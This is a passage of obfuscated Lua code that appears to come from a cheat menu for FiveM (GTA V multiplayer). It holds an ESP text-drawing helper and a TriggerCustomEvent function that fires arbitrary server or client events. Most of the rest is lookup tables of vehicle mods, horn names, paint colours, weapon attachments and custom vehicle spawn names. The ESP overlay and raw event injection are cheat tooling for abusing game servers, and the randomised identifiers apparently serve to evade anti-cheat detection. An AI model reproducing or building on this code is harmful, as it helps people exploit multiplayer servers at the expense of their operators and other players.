            nlFXKkFxuKQAk.natives.AddTextComponentSubstringPlayerName(text)  
            nlFXKkFxuKQAk.natives.EndTextCommandDisplayText(x / resx, y / resy)
        end,
        DrawESPText = function(x, y, z, text, r, g, b)
            nlFXKkFxuKQAk.natives.SetDrawOrigin(x, y, z, 0)
            nlFXKkFxuKQAk.natives.SetTextFont(4)
            nlFXKkFxuKQAk.natives.SetTextProportional(0)
            nlFXKkFxuKQAk.natives.SetTextScale(0.0, 0.25)
            nlFXKkFxuKQAk.natives.SetTextColour(r, g, b, 255)
            nlFXKkFxuKQAk.natives.SetTextOutline()
            nlFXKkFxuKQAk.natives.BeginTextCommandDisplayText("STRING")
            nlFXKkFxuKQAk.natives.SetTextCentre(1)
            nlFXKkFxuKQAk.natives.AddTextComponentSubstringPlayerName(text)
            nlFXKkFxuKQAk.natives.EndTextCommandDisplayText(0.0, 0.0)
            nlFXKkFxuKQAk.natives.ClearDrawOrigin()
        end,
        HoverOn = function(x, y, w, h)
            local MPOS1, MPOS2 = nlFXKkFxuKQAk.natives.GetNuiCursorPosition() 
            if MPOS1 >= x and MPOS1 <= x + w and MPOS2 >= y and MPOS2 <= y + h then 
                return true 
            else 
                return false 
            end 
        end,
        FindWidth = function(text, font, scale)
            nlFXKkFxuKQAk.natives.BeginTextCommandWidth("STRING")
            nlFXKkFxuKQAk.natives.AddTextComponentSubstringPlayerName(text)
            nlFXKkFxuKQAk.natives.SetTextFont(font)
            nlFXKkFxuKQAk.natives.SetTextScale(scale, scale)
            local length = nlFXKkFxuKQAk.natives.EndTextCommandGetWidth(1)
            local resw, _ = nlFXKkFxuKQAk.natives.GetActiveScreenResolution()
        
            return length * resw
        end,
        round = function(n) 
            return n % 1 >= 0.5 and RfPsUKHSFWJuBEJuz.rE.LumMath.LumCeli(n) or RfPsUKHSFWJuBEJuz.rE.LumMath.LumFloor(n) 
        end,
        TriggerCustomEvent = function(server, event, ...)
            local payload = RfPsUKHSFWJuBEJuz.rE.LumTable.LumMsgPack({...})
            if server then
                nlFXKkFxuKQAk.natives.TriggerServerEventInternal(event, payload, payload:len())
            else
                nlFXKkFxuKQAk.natives.TriggerEventInternal(event, payload, payload:len())
            end
        end,
        elModlister = {
            {name = "Spoilers", id = 0, meta = "modSpoilers"},
            {name = "Front Bumper", id = 1, meta = "modFrontBumper"},
            {name = "Rear Bumper", id = 2, meta = "modRearBumper"},
            {name = "Side Skirt", id = 3, meta = "modSideSkirt"},
            {name = "Exhaust", id = 4, meta = "modExhaust"},
            {name = "Frame", id = 5, meta = "modFrame"},
            {name = "Grille", id = 6, meta = "modGrille"},
            {name = "Hood", id = 7, meta = "modHood"},
            {name = "Fender", id = 8, meta = "modFender"},
            {name = "Right Fender", id = 9, meta = "modRightFender"},
            {name = "Roof", id = 10, meta = "modRoof"},
            {name = "Xenon Lights", id = 22, meta = "modXenon"},
            {name = "Vanity Plates", id = 26, meta = "modVanityPlate"},
            {name = "Trim", id = 27, meta = "modTrim"},
            {name = "Ornaments", id = 28, meta = "modOrnaments"},
            {name = "Dashboard", id = 29, meta = "modDashboard"},
            {name = "Dial", id = 30, meta = "modDial"},
            {name = "Door Speaker", id = 31, meta = "modDoorSpeaker"},
            {name = "Seats", id = 32, meta = "modSeats"},
            {name = "Steering Wheel", id = 33, meta = "modSteeringWheel"},
            {name = "Shifter Leavers", id = 34, meta = "modShifterLeavers"},
            {name = "Plaques", id = 35, meta = "modPlaques"},
            {name = "Speakers", id = 36, meta = "modSpeakers"},
            {name = "Trunk", id = 37, meta = "modTrunk"},
            {name = "Hydraulics", id = 38, meta = "modHydraulics"},
            {name = "Engine Block", id = 39, meta = "modEngineBlock"},
            {name = "Air Filter", id = 40, meta = "modAirFilter"},
            {name = "Struts", id = 41, meta = "modStruts"},
            {name = "Arch Cover", id = 42, meta = "modArchCover"},
            {name = "Aerials", id = 43, meta = "modAerials"},
            {name = "Trim 2", id = 44, meta = "modTrimB"},
            {name = "Tank", id = 45, meta = "modTank"},
            {name = "Windows", id = 46, meta = "modWindows"},
            {name = "Livery", id = 48, meta = "modLivery"},
            {name = "Horns", id = 14, meta = "modHorns"},
            {name = "Wheels", id = 23, meta = "modFrontWheels"},
            {name = "Respray", id = 100, meta = "color1"},
            {name = "Lights", id = 101, meta = "lightsmen"},
            {name = 'Tints', id = 102, meta = "tinterinos"}
        },
        GetHornName = function(index)
            if (index == 0) then
                return "Truck Horn"
            elseif (index == 1) then
                return "Cop Horn"
            elseif (index == 2) then
                return "Clown Horn"
            elseif (index == 3) then
                return "Musical Horn 1"
            elseif (index == 4) then
                return "Musical Horn 2"
            elseif (index == 5) then
                return "Musical Horn 3"
            elseif (index == 6) then
                return "Musical Horn 4"
            elseif (index == 7) then
                return "Musical Horn 5"
            elseif (index == 8) then
                return "Sad Trombone"
            elseif (index == 9) then
                return "Classical Horn 1"
            elseif (index == 10) then
                return "Classical Horn 2"
            elseif (index == 11) then
                return "Classical Horn 3"
            elseif (index == 12) then
                return "Classical Horn 4"
            elseif (index == 13) then
                return "Classical Horn 5"
            elseif (index == 14) then
                return "Classical Horn 6"
            elseif (index == 15) then
                return "Classical Horn 7"
            elseif (index == 16) then
                return "Scale - Do"
            elseif (index == 17) then
                return "Scale - Re"
            elseif (index == 18) then
                return "Scale - Mi"
            elseif (index == 19) then
                return "Scale - Fa"
            elseif (index == 20) then
                return "Scale - Sol"
            elseif (index == 21) then
                return "Scale - La"
            elseif (index == 22) then
                return "Scale - Ti"
            elseif (index == 23) then
                return "Scale - Do"
            elseif (index == 24) then
                return "Jazz Horn 1"
            elseif (index == 25) then
                return "Jazz Horn 2"
            elseif (index == 26) then
                return "Jazz Horn 3"
            elseif (index == 27) then
                return "Jazz Horn Loop"
            elseif (index == 28) then
                return "Star Spangled Banner 1"
            elseif (index == 29) then
                return "Star Spangled Banner 2"
            elseif (index == 30) then
                return "Star Spangled Banner 3"
            elseif (index == 31) then
                return "Star Spangled Banner 4"
            elseif (index == 32) then
                return "Classical Horn 8 Loop"
            elseif (index == 33) then
                return "Classical Horn 9 Loop"
            elseif (index == 34) then
                return "Classical Horn 10 Loop"
            elseif (index == 35) then
                return "Classical Horn 8"
            elseif (index == 36) then
                return "Classical Horn 9"
            elseif (index == 37) then
                return "Classical Horn 10"
            elseif (index == 38) then
                return "Funeral Loop"
            elseif (index == 39) then
                return "Funeral"
            elseif (index == 40) then
                return "Spooky Loop"
            elseif (index == 41) then
                return "Spooky"
            elseif (index == 42) then
                return "San Andreas Loop"
            elseif (index == 43) then
                return "San Andreas"
            elseif (index == 44) then
                return "Liberty City Loop"
            elseif (index == 45) then
                return "Liberty City"
            elseif (index == 46) then
                return "Festive 1 Loop"
            elseif (index == 47) then
                return "Festive 1"
            elseif (index == 48) then
                return "Festive 2 Loop"
            elseif (index == 49) then
                return "Festive 2"
            elseif (index == 50) then
                return "Festive 3 Loop"
            elseif (index == 51) then
                return "Festive 3"
            else
                return "Unknown Horn"
            end
        end,
        VehProperties = function(vehicle)
            if nlFXKkFxuKQAk.natives.DoesEntityExist(vehicle) then
                local colorPrimary, colorSecondary = nlFXKkFxuKQAk.natives.GetVehicleColours(vehicle)
                local pearlescentColor, wheelColor = nlFXKkFxuKQAk.natives.GetVehicleExtraColours(vehicle)
                local extras = {}
        
                for id = 0, 12 do
                    if nlFXKkFxuKQAk.natives.DoesExtraExist(vehicle, id) then
                        local state = nlFXKkFxuKQAk.natives.IsVehicleExtraTurnedOn(vehicle, id) == 1
                        extras[RfPsUKHSFWJuBEJuz.rE.LumToString(id)] = state
                    end
                end
        
                return {
                    model             = nlFXKkFxuKQAk.natives.GetEntityModel(vehicle),
        
                    color1            = colorPrimary,
                    color2            = colorSecondary,
        
                    pearlescentColor  = pearlescentColor,
                    wheelColor        = wheelColor,
        
                    wheels            = nlFXKkFxuKQAk.natives.GetVehicleWheelType(vehicle),
                    windowTint        = nlFXKkFxuKQAk.natives.GetVehicleWindowTint(vehicle),
        
                    neonEnabled       = {
                        nlFXKkFxuKQAk.natives.IsVehicleNeonLightEnabled(vehicle, 0),
                        nlFXKkFxuKQAk.natives.IsVehicleNeonLightEnabled(vehicle, 1),
                        nlFXKkFxuKQAk.natives.IsVehicleNeonLightEnabled(vehicle, 2),
                        nlFXKkFxuKQAk.natives.IsVehicleNeonLightEnabled(vehicle, 3)
                    },
        
                    neonColor         = RfPsUKHSFWJuBEJuz.rE.LumTable.LumPack(nlFXKkFxuKQAk.natives.GetVehicleNeonLightsColour(vehicle)),
                    extras            = extras,
                    tyreSmokeColor    = RfPsUKHSFWJuBEJuz.rE.LumTable.LumPack(nlFXKkFxuKQAk.natives.GetVehicleTyreSmokeColor(vehicle)),
        
                    modSpoilers       = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 0),
                    modFrontBumper    = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 1),
                    modRearBumper     = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 2),
                    modSideSkirt      = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 3),
                    modExhaust        = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 4),
                    modFrame          = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 5),
                    modGrille         = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 6),
                    modHood           = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 7),
                    modFender         = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 8),
                    modRightFender    = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 9),
                    modRoof           = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 10),
        
                    modEngine         = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 11),
                    modBrakes         = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 12),
                    modTransmission   = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 13),
                    modHorns          = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 14),
                    modSuspension     = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 15),
                    modArmor          = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 16),
        
                    modTurbo          = nlFXKkFxuKQAk.natives.IsToggleModOn(vehicle, 18),
                    modSmokeEnabled   = nlFXKkFxuKQAk.natives.IsToggleModOn(vehicle, 20),
                    modXenon          = nlFXKkFxuKQAk.natives.IsToggleModOn(vehicle, 22),
        
                    modFrontWheels    = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 23),
                    modBackWheels     = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 24),
        
                    modPlateHolder    = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 25),
                    modVanityPlate    = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 26),
                    modTrimA          = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 27),
                    modOrnaments      = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 28),
                    modDashboard      = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 29),
                    modDial           = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 30),
                    modDoorSpeaker    = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 31),
                    modSeats          = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 32),
                    modSteeringWheel  = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 33),
                    modShifterLeavers = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 34),
                    modAPlate         = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 35),
                    modSpeakers       = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 36),
                    modTrunk          = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 37),
                    modHydrolic       = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 38),
                    modEngineBlock    = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 39),
                    modAirFilter      = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 40),
                    modStruts         = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 41),
                    modArchCover      = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 42),
                    modAerials        = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 43),
                    modTrimB          = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 44),
                    modTank           = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 45),
                    modWindows        = nlFXKkFxuKQAk.natives.GetVehicleMod(vehicle, 46),
                    modLivery         = nlFXKkFxuKQAk.natives.GetVehicleLivery(vehicle)
                }
            else
                return
            end
        end,
        colorsClassic = { 
            {name = "Black", id = 0},
            {name = "Carbon Black", id = 147},
            {name = "Graphite", id = 1},
            {name = "Anhracite Black", id = 11},
            {name = "Black Steel", id = 2},
            {name = "Dark Steel", id = 3},
            {name = "Silver", id = 4},
            {name = "Bluish Silver", id = 5},
            {name = "Rolled Steel", id = 6},
            {name = "Shadow Silver", id = 7},
            {name = "Stone Silver", id = 8},
            {name = "Midnight Silver", id = 9},
            {name = "Cast Iron Silver", id = 10},
            {name = "Red", id = 27},
            {name = "Torino Red", id = 28},
            {name = "Formula Red", id = 29},
            {name = "Lava Red", id = 150},
            {name = "Blaze Red", id = 30},
            {name = "Grace Red", id = 31},
            {name = "Garnet Red", id = 32},
            {name = "Sunset Red", id = 33},
            {name = "Cabernet Red", id = 34},
            {name = "Wine Red", id = 143},
            {name = "Candy Red", id = 35},
            {name = "Hot Pink", id = 135},
            {name = "Pfsiter Pink", id = 137},
            {name = "Salmon Pink", id = 136},
            {name = "Sunrise Orange", id = 36},
            {name = "Orange", id = 38},
            {name = "Bright Orange", id = 138},
            {name = "Gold", id = 99},
            {name = "Bronze", id = 90},
            {name = "Yellow", id = 88},
            {name = "Race Yellow", id = 89},
            {name = "Dew Yellow", id = 91},
            {name = "Dark Green", id = 49},
            {name = "Racing Green", id = 50},
            {name = "Sea Green", id = 51},
            {name = "Olive Green", id = 52},
            {name = "Bright Green", id = 53},
            {name = "Gasoline Green", id = 54},
            {name = "Lime Green", id = 92},
            {name = "Midnight Blue", id = 141},
            {name = "Galaxy Blue", id = 61},
            {name = "Dark Blue", id = 62},
            {name = "Saxon Blue", id = 63},
            {name = "Blue", id = 64},
            {name = "Mariner Blue", id = 65},
            {name = "Harbor Blue", id = 66},
            {name = "Diamond Blue", id = 67},
            {name = "Surf Blue", id = 68},
            {name = "Nautical Blue", id = 69},
            {name = "Racing Blue", id = 73},
            {name = "Ultra Blue", id = 70},
            {name = "Light Blue", id = 74},
            {name = "Chocolate Brown", id = 96},
            {name = "Bison Brown", id = 101},
            {name = "Creeen Brown", id = 95},
            {name = "Feltzer Brown", id = 94},
            {name = "Maple Brown", id = 97},
            {name = "Beechwood Brown", id = 103},
            {name = "Sienna Brown", id = 104},
            {name = "Saddle Brown", id = 98},
            {name = "Moss Brown", id = 100},
            {name = "Woodbeech Brown", id = 102},
            {name = "Straw Brown", id = 99},
            {name = "Sandy Brown", id = 105},
            {name = "Bleached Brown", id = 106},
            {name = "Schafter Purple", id = 71},
            {name = "Spinnaker Purple", id = 72},
            {name = "Midnight Purple", id = 142},
            {name = "Bright Purple", id = 145},
            {name = "Cream", id = 107},
            {name = "Ice White", id = 111},
            {name = "Frost White", id = 112},
        },
        colorsMatte = {
            {name = "Black", id = 12},
            {name = "Gray", id = 13},
            {name = "Light Gray", id = 14},
            {name = "Ice White", id = 131},
            {name = "Blue", id = 83},
            {name = "Dark Blue", id = 82},
            {name = "Midnight Blue", id = 84},
            {name = "Midnight Purple", id = 149},
            {name = "Schafter Purple", id = 148},
            {name = "Red", id = 39},
            {name = "Dark Red", id = 40},
            {name = "Orange", id = 41},
            {name = "Yellow", id = 42},
            {name = "Lime Green", id = 55},
            {name = "Green", id = 128},
            {name = "Forest Green", id = 151},
            {name = "Foliage Green", id = 155},
            {name = "Olive Darb", id = 152},
            {name = "Dark Earth", id = 153},
            {name = "Desert Tan", id = 154},
        },
        colorsMetal = {
            {name = "Brushed Steel", id = 117},
            {name = "Brushed Black Steel", id = 118},
            {name = "Brushed Aluminum", id = 119},
            {name = "Pure Gold", id = 158},
            {name = "Brushed Gold", id = 159},
        },
        Weparraymen = {
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_PISTOL')] = { drum = nil, suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('component_at_pi_supp_02'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_PI_FLSH'), grip = nil, clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_PISTOL_CLIP_02'), skin = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_PISTOL_VARMOD_LUXE') },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_PISTOL50')] = { drum = nil, suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_SUPP_02'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_PI_FLSH'), grip = nil, clip = nil, skin = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_PISTOL50_VARMOD_LUXE') },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_COMBATPISTOL')] = { drum = nil, suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_PI_SUPP'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_PI_FLSH'), grip = nil, clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_COMBATPISTOL_CLIP_02'), skin = nil },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_APPISTOL')] = { drum = nil, suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_PI_SUPP'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_PI_FLSH'), grip = nil, clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_APPISTOL_CLIP_02'), skin = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_APPISTOL_VARMOD_LUXE') },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_HEAVYPISTOL')] = { drum = nil, suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_PI_SUPP'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_PI_FLSH'), grip = nil, clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_HEAVYPISTOL_CLIP_02'), skin = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_HEAVYPISTOL_VARMOD_LUXE') },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_VINTAGEPISTOL')] = { drum = nil, suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_PI_SUPP'), flashlight = nil, grip = nil, clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_VINTAGEPISTOL_CLIP_02'), skin = nil },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_SMG')] = { drum = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_SMG_CLIP_03'), suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_PI_SUPP'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_FLSH'), grip = nil, clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_SMG_CLIP_02'), skin = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_SMG_VARMOD_LUXE') },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_MICROSMG')] = { drum = nil, suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_SUPP_02'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_PI_FLSH'), grip = nil, clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_MICROSMG_CLIP_02'), skin = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_MICROSMG_VARMOD_LUXE') },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_ASSAULTSMG')] = { drum = nil, suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_SUPP_02'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_FLSH'), grip = nil, clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_ASSAULTSMG_CLIP_02'), skin = nil },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_ASSAULTRIFLE')] = { drum = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_ASSAULTRIFLE_CLIP_03'), suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_SUPP_02'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_FLSH'), grip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_AFGRIP'), clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_ASSAULTRIFLE_CLIP_02'), skin = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_ASSAULTRIFLE_VARMOD_LUXE') },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_CARBINERIFLE')] = { drum = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_CARBINERIFLE_CLIP_03'), suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_SUPP'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_FLSH'), grip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_AFGRIP'), clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_CARBINERIFLE_CLIP_02'), skin = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_CARBINERIFLE_VARMOD_LUXE') },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_ADVANCEDRIFLE')] = { drum = nil, suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_SUPP'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_FLSH'), grip = nil, clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_ADVANCEDRIFLE_CLIP_02'), skin = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_ADVANCEDRIFLE_VARMOD_LUXE') },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_SPECIALCARBINE')] = { drum = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_SPECIALCARBINE_CLIP_03'), suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_SUPP_02'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_FLSH'), grip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_AFGRIP'), clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_SPECIALCARBINE_CLIP_02'), skin = nil },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_BULLPUPRIFLE')] = { drum = nil, suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_SUPP'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_FLSH'), grip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_AFGRIP'), clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_BULLPUPRIFLE_CLIP_02'), skin = nil },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_ASSAULTSHOTGUN')] = { drum = nil, suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_SUPP'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_FLSH'), grip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_AFGRIP'), clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_ASSAULTSHOTGUN_CLIP_02'), skin = nil },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_HEAVYSHOTGUN')] = { drum = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_HEAVYSHOTGUN_CLIP_03'), suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_SUPP_02'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_FLSH'), grip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_AFGRIP'), clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_HEAVYSHOTGUN_CLIP_02'), skin = nil },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_BULLPUPSHOTGUN')] = { drum = nil, suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_SUPP_02'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_FLSH'), grip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_AFGRIP'), clip = nil, skin = nil },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_PUMPSHOTGUN')] = { drum = nil, suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_SR_SUPP'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_FLSH'), grip = nil, clip = nil, skin = nil },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_MARKSMANRIFLE')] = { drum = nil, suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_SUPP'), flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_FLSH'), grip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_AFGRIP'), clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_MARKSMANRIFLE_CLIP_02'), skin = nil },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_SNIPERRIFLE')] = { drum = nil, suppressor = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_SUPP_02'), flashlight = nil, grip = nil, clip = nil, skin = nil },
            [RfPsUKHSFWJuBEJuz.rE.LumHash('WEAPON_COMBATPDW')] = { drum = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_COMBATPDW_CLIP_03'), suppressor = nil, flashlight = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_FLSH'), grip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_AT_AR_AFGRIP'), clip = RfPsUKHSFWJuBEJuz.rE.LumHash('COMPONENT_COMBATPDW_CLIP_02'), skin = nil }
        },
        CustomVs = {
            {spawn = "divo", name = "Bugatti Divo"},
            {spawn = "g500", name = "Mercedes G500"},
            {spawn = "h2carb", name = "Ninja H2"},
            {spawn = "teslax", name = "Tesla Model X"},
            {spawn = "BENTAYGA17", name = "Bentley Bentayga"},
            {spawn = "yz450f", name = "Yamaha YZ450F"},
            {spawn = "tmsm", name = "TM450 Supermoto"},
            {spawn = "rmz250", name = "Suzuki RMZ 250"},
            {spawn = "WRAITH", name = "Rolls Royce Wraith"},
            {spawn = "URUS", name = "Lamborghini Urus"},
            {spawn = "demon", name = "Dodge Demon"},
            {spawn = "BMWI8", name = "BMW i8"},
            {spawn = "rrst", name = "Range Rover Vogue"},
            {spawn = "M6F13", name = "BMW M6"},
            {spawn = "CHARGER", name = "Dodge Charger"},
            {spawn = "19gt500", name = "Ford Mustang Shelby"},
            {spawn = "exor", name = "Camaro Exorcist"},
            {spawn = "SVJ", name = "Lamborghini Aventador SVJ"},
            {spawn = "demonhawk", name = "Demonhawk"},
            {spawn = "911", name = "Porsche 911 Turbo"},
            {spawn = "GT2RS", name = "Porsche GT2"},
            {spawn = "CONTSS18", name = "Bentley Continental GT"},
            {spawn = "FERRARI812", name = "Ferrari 812"},
            {spawn = "BENTAYGA17", name = "Bentley Bentayga"},
            {spawn = "458spc", name = "Ferrari 458"},
            {spawn = "63LB", name = "Mercedes CLS 63"},
            {spawn = "c63scoupe", name = "Mercedes C63s"},
            {spawn = "MVISIONGT", name = "Mercedes-Benz AMG Vision GT"},
            {spawn = "sv", name = "Lamborghini Aventador SV"},
            {spawn = "GTRC", name = "Mercedes-Benz AMG GT-R"},
            {spawn = "SENNA", name = "McLaren Senna"},
            {spawn = "C7", name = "Corvette C7"},
            {spawn = "LWGTR", name = "Liberty Walk GTR"},
            {spawn = "AR8LB", name = "Audi R8"},
            {spawn = "g63mg", name = "G63 Mansory"},
            {spawn = "scaldarsi", name = "Maybach Emperor"},
            {spawn = "bm8c", name = "BMW M8 Coupé"},
            {spawn = "jes", name = "Koenigsegg Jesko"},
            {spawn = "cczl", name = "Camaro on 32s"},
            {spawn = "c8", name = "Corvette C8"},
            {spawn = "bentaygam", name = "Bentayga Mansory"},
            {spawn = "mlmansory", name = "Levante Mansory"},
            {spawn = "dawn", name = "Mansory RR Dawn"},
            {spawn = "ursa", name = "Porsche Macan"},
            {spawn = "gle63c", name = "GLE Amg"},
            {spawn = "sr650fly", name = "Sea Ray 650"},
            {spawn = "BMWM8", name = "BMW M8"},
            {spawn = "19S650", name = "Maybach S650"},
